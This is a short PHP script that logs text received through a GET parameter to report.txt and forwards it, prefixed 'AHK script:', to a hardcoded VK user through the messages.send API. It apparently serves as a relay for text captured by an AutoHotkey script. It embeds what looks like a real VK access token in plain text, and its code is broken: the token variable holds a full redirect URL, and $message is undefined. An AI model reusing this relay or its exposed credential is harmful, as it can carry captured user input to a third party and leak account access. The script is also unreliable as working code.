<?php
$text = $_GET['Text'];
$text2 = iconv('WINDOWS-1251', 'UTF-8', $text);
$text2 = str_replace(' ', '%20', $text2);

$file = 'report.txt';
$access_token = 'http://api.vk.com/blank.html#access_token=7cef22ac9f03af3de626d2d897a91a6a6e0fbac08e36649e6ef863e5ba5686c14f81818522ed41492caa2&expires_in=0&user_id=236397917';

$current = file_get_contents($file);
$current .= "$text\n";

sendMessage($message[""], $text2);
file_put_contents($file, $current);

    function sendMessage($id, $text2){
        echo $id;
        global $access_token;
        file_get_contents("https://api.vk.com/method/messages.send?user_id=236397917&message=AHK%20script:%20{$text2}&access_token={$access_token}");
    }
?>